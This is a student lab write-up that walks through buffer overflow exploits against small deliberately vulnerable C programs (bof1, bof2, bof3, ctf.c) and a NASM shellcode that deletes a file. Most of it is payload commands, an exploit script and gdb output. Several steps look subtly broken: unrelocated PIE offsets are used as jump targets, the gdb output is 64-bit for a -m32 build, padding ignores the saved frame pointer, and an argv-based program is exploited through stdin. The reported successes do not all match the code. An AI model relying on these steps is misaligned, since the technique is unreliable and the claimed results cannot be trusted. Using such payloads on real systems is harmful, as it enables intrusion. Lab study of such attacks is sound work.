# 22110026, Lê Huy Hoàng
**Lab#1: Conduct buffer overflow attack on _bof1.c_, _bof2.c_, _bof3.c_ programs.**
## bo1.c
Conduct a buffer overflow attack on _bof1.c_ 
```ruby
#include<stdio.h>
#include<unistd.h>
void secretFunc()
{
    printf("Congratulation!\n:");
}
int vuln(){
    char array[200];
    printf("Enter text:");
    gets(array);
    return 0;
}
int main(int argc, char*argv[]){
    if (argv[1]==0){
        prinf("Missing arguments\n");
    }
    vuln();
    return 0;
}
```
 - Step 1: Compile the program
      - Using this\
        ```gcc -m32 -fno-stack-protector -z execstack -o bof1 bof1.c```
 - Step 2: Find the Address of `secretFunc()`
      - Use ```gdb``` to find the address of ```secretFunc()```:
    ```ruby
    gdb ./bof1
    (gdb) disassemble secretFunc
    Dump of assembler code for function secretFunc:
    0x00000000000011a5 <+0>:     push   %rbp
    0x00000000000011a6 <+1>:     mov    %rsp,%rbp
    0x00000000000011a9 <+4>:     lea    0xe50(%rip),%rax        # 0x2000
    0x00000000000011b0 <+11>:    mov    %rax,%rdi
    0x00000000000011b3 <+14>:    mov    $0x0,%eax
    0x00000000000011b8 <+19>:    call   0x1020 <printf@plt>
    0x00000000000011bd <+24>:    nop
    0x00000000000011be <+25>:    pop    %rbp
    0x00000000000011bf <+26>:    ret
    End of assembler dump.
    (gdb) print &secretFunc
    $1 = (void (*)()) 0x11a5 <secretFunc>
    ```
     - The address is  `0x00000000000011a5`.
 - Step 3: Craft the input\
   ```python -c 'import sys; sys.stdout.buffer.write(b"A" * 200 + b"\xa5\x11\x00\x00\x00\x00\x00\x00")' > exploit_input```
 - Step 4: Run the program with exploit\
   ```./bof1 < exploit_input```
   - If you get this, means correct:\
   ```Congratulations!```
## bof2.c
Conduct a buffer overflow attack on _bof2.c_ 
```ruby
#include <stdlib.h>
#include <stdio.h>
void main(int argc, char *argv[])
{
  int var;
  int check = 0x04030201;
  char buf[40];
  fgets(buf,45,stdin);
  printf("\n[buf]: %s\n", buf);
  printf("[check] 0x%x\n", check);
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
  if (check == 0xdeadbeef)
   {
     printf("Yeah! You win!\n");
   }
}
```
- Step 1: Compile the program\
First, ensure the program is compiled without stack protection and with debugging information. You can use the following command:\
```gcc -o buffer_overflow buffer_overflow.c -fno-stack-protector -z execstack -g```
- Step 2: Run the program
```./bof2```
- Step 3: Check the buffer size
You can do this by input some random things, for example: 
```ruby
/mnt/d/uni/2025/info/seclabs/bof $ ./bof2
test input
[buf]: test input
[check] 0x4030201
```
- Step 4: Create a exploit input
You need to construct an input that:
    - Fills buf with 40 characters.
    - Overwrites check with the value 0xdeadbeef in little-endian format.
- Step 5: Generate the input
```python -c 'print("A" * 40 + "\xef\xbe\xad\xde")' > exploit_input```\
This command creates a file named exploit_input containing:
    - 40 'A's (filling buf)
    - The bytes ef be ad de (overwriting check)
- Step 6: run the program with exploit input
```./bof2 < exploit_input```
- Step 7: Check the output
If successful, you get this: 
```ruby
[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0xdeadbeef
Yeah! You win!
```
## bof3.c
Conduct a buffer overflow attack on _bof3.c_ 
```ruby
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
void shell() {
    printf("You made it! The shell() function is executed\n");
}
void sup() {
    printf("Congrat!\n");
}
void main()
{ 
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```
- Step 1: Compile the program
  ```gcc -o bof3 bof3.c -fno-stack-protector -z execstack -g```
- Step 2: Open ```gdb``` \
  ```gdb ./bof3```
- Step 3: Find the address of ```shell```
  ```ruby
    (gdb) disassemble shell
    Dump of assembler code for function shell:
       0x0000000000001195 <+0>:     push   %rbp
       0x0000000000001196 <+1>:     mov    %rsp,%rbp
       0x0000000000001199 <+4>:     lea    0xe60(%rip),%rax        # 0x2000
       0x00000000000011a0 <+11>:    mov    %rax,%rdi
       0x00000000000011a3 <+14>:    call   0x1030 <puts@plt>
       0x00000000000011a8 <+19>:    nop
       0x00000000000011a9 <+20>:    pop    %rbp
       0x00000000000011aa <+21>:    ret
    End of assembler dump.  
  ```
  And this
  ```ruby
  (gdb) print &shell
  $1 = (void (*)()) 0x1195 <shell>
  ```
- Step 4: Create a exploit input
  ```ruby
  python -c 'import sys; sys.stdout.buffer.write(b"A" * 128 + b"\x95\x11\x00\x00")' > exploit_input
  ```
- Step 5: Run the program with exploit input
  ```./bof3 < exploit_input```
- Step 6: Check the output
  If you got this:
  ```ruby
  You made it! The shell() function is executed
  ```
  means you are correct.
#
**Lab#2:**
- Inject code to delete file: file_del.asm is given on github
- Conduct attack on ctf.c
#
## Inject code to delete file: file_del.asm is given on github
```ruby
; delete dummyfile in nasm

section .text
global _start
_start:
    jmp short ender
starter:
    mov eax,10
    mov ebx,_filename
    int 0x80
_exit:
    mov eax,1
    int 0x80

ender:
    call starter
_filename:
    db 'dummyfile',0
```
- Step 1: Update and install nasm if you don't have it yet
  - Run these commands in your favorite WSL\
    ```sudo apk update```\
    ```sudo apk add nasm```
- Step 2: Compile and run the code
  - Assemble the code\
    ```nasm -f elf32 file_del.asm -o file_del.o```
  - Link the object file\
    ```ld -m elf_i386 file_del.o -o file_del```
  - Run the program\
    ```./file_del```
- Step 3: If you run and nothing happens, likely means that you don't have a dummyfile yet
  - Check by using this ```ls```
  ```ruby
  Dockerfile                 bof3.c                     flag.c
  a.out                      docker                     flag.out
  bof1                       docker-compose.debug.yml   flow.c
  bof1.c                     docker-compose.yml         flow.out
  bof1.out                   exploit_input              input.txt
  bof2                       file_del                   pattern.c
  bof2.c                     file_del.asm               pattern.out
  bof3                       file_del.o                 peda-session-flag.out.txt
  ```
  - As above means you don't have a ```dummyfile``` yet, you can create one by\
    ```touch dummyfile```
  - Verify everything by using ```ls``` again
  ```ruby
  Dockerfile                 docker                     flag.out
  a.out                      docker-compose.debug.yml   flow.c
  bof1                       docker-compose.yml         flow.out
  bof1.c                     dummyfile                  input.txt
  bof1.out                   exploit_input              pattern.c
  bof2                       file_del                   pattern.out
  bof2.c                     file_del.asm               peda-session-flag.out.txt
  bof3                       file_del.o
  bof3.c                     flag.c
  ```
    You can see there's a ```dummyfile``` just below ```docker-compose.yml```
  - Step 4: Run the program again
    ```./file_del``` and ```ls```
  ```ruby
  Dockerfile                 bof3.c                     flag.c
  a.out                      docker                     flag.out
  bof1                       docker-compose.debug.yml   flow.c
  bof1.c                     docker-compose.yml         flow.out
  bof1.out                   exploit_input              input.txt
  bof2                       file_del                   pattern.c
  bof2.c                     file_del.asm               pattern.out
  bof3                       file_del.o                 peda-session-flag.out.txt
  ```
    The ```dummyfile``` is deleted, means that we're correct.
## Conduct attack on ctf.c
```ruby
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void myfunc(int p, int q)
{
	char filebuf[64];
	FILE *f = fopen("flag1.txt","r");
	if (f == NULL) {
		printf("flag1 is missing!\n");
		exit(0);
	}
	fgets(filebuf,64,f);

	printf("myfunc is reached");
	if (p!=0x04081211)
	{
		printf(", but you fail to get the flag");
		return;
	}
	if (q!=0x44644262)
	{
		printf(", but you fail to get the flag");
		return;
	}
	printf("You got the flag\n"); 
}
void vuln(char* s)
{
	char buf[100];
	strcpy(buf,s);
	puts(buf);
}
int main(int argc, char* argv[])
{
	vuln(argv[1]);
    return 0;
}
```
- Step 1: Compile the program\
  ```gcc -g -fno-stack-protector -o ctf ctf.c```
- Step 2: Determine the address of ```myfunc()```\
  ```ruby
  gdb ./ctf
  (gdb) disassemble myfunc
  Dump of assembler code for function myfunc:
       0x00000000000011d5 <+0>:     push   %rbp
       0x00000000000011d6 <+1>:     mov    %rsp,%rbp
       0x00000000000011d9 <+4>:     sub    $0x60,%rsp
       0x00000000000011dd <+8>:     mov    %edi,-0x54(%rbp)
       0x00000000000011e0 <+11>:    mov    %esi,-0x58(%rbp)
       0x00000000000011e3 <+14>:    lea    0xe16(%rip),%rax        # 0x2000
       0x00000000000011ea <+21>:    mov    %rax,%rsi
       0x00000000000011ed <+24>:    lea    0xe0e(%rip),%rax        # 0x2002
       0x00000000000011f4 <+31>:    mov    %rax,%rdi
       0x00000000000011f7 <+34>:    call   0x1060 <fopen@plt>
       0x00000000000011fc <+39>:    mov    %rax,-0x8(%rbp)
       0x0000000000001200 <+43>:    cmpq   $0x0,-0x8(%rbp)
       0x0000000000001205 <+48>:    jne    0x1220 <myfunc+75>
       0x0000000000001207 <+50>:    lea    0xdfe(%rip),%rax        # 0x200c
       0x000000000000120e <+57>:    mov    %rax,%rdi
       0x0000000000001211 <+60>:    call   0x1050 <puts@plt>
       0x0000000000001216 <+65>:    mov    $0x0,%edi
       0x000000000000121b <+70>:    call   0x1070 <exit@plt>
       0x0000000000001220 <+75>:    mov    -0x8(%rbp),%rdx
       0x0000000000001224 <+79>:    lea    -0x50(%rbp),%rax
       0x0000000000001228 <+83>:    mov    $0x40,%esi
       0x000000000000122d <+88>:    mov    %rax,%rdi
       0x0000000000001230 <+91>:    call   0x1040 <fgets@plt>
    --Type <RET> for more, q to quit, c to continue without paging--c
       0x0000000000001235 <+96>:    lea    0xde2(%rip),%rax        # 0x201e
       0x000000000000123c <+103>:   mov    %rax,%rdi
       0x000000000000123f <+106>:   mov    $0x0,%eax
       0x0000000000001244 <+111>:   call   0x1030 <printf@plt>
       0x0000000000001249 <+116>:   cmpl   $0x4081211,-0x54(%rbp)
       0x0000000000001250 <+123>:   je     0x1268 <myfunc+147>
       0x0000000000001252 <+125>:   lea    0xdd7(%rip),%rax        # 0x2030
       0x0000000000001259 <+132>:   mov    %rax,%rdi
       0x000000000000125c <+135>:   mov    $0x0,%eax
       0x0000000000001261 <+140>:   call   0x1030 <printf@plt>
       0x0000000000001266 <+145>:   jmp    0x1296 <myfunc+193>
       0x0000000000001268 <+147>:   cmpl   $0x44644262,-0x58(%rbp)
       0x000000000000126f <+154>:   je     0x1287 <myfunc+178>
       0x0000000000001271 <+156>:   lea    0xdb8(%rip),%rax        # 0x2030
       0x0000000000001278 <+163>:   mov    %rax,%rdi
       0x000000000000127b <+166>:   mov    $0x0,%eax
       0x0000000000001280 <+171>:   call   0x1030 <printf@plt>
       0x0000000000001285 <+176>:   jmp    0x1296 <myfunc+193>
       0x0000000000001287 <+178>:   lea    0xdc1(%rip),%rax        # 0x204f
       0x000000000000128e <+185>:   mov    %rax,%rdi
       0x0000000000001291 <+188>:   call   0x1050 <puts@plt>
       0x0000000000001296 <+193>:   leave
       0x0000000000001297 <+194>:   ret
  End of assembler dump.
  (gdb) print &myfunc
  $1 = (void (*)(int, int)) 0x11d5 <myfunc>
    ```
  - Step 3: Create the exploit, for example, names it as ```ctfexploit.py```
    ```ruby
    p = 0x04081211  # Parameter p
    q = 0x44644262  # Parameter q
    myfunc_addr = 0x11d5  # Replace with the actual address
    
    # Construct the payload
    payload = b"A" * 100  # Fill the buffer
    payload += myfunc_addr.to_bytes(4, 'little')  # Overwrite return address
    payload += p.to_bytes(4, 'little')  # Parameter p
    payload += q.to_bytes(4, 'little')  # Parameter q
    
    with open("exploit_input", "wb") as f:
        f.write(payload)
    ```
    Run it with ```python ctfexploit.py```
  - Step 4: Run the program with exploit
    ```./ctf < exploit_input```
  - Step 5: Check the output\
    If you are correct, you will get this:
    ```ruby
    myfunc is reached, You got the flag
    ```
    

    
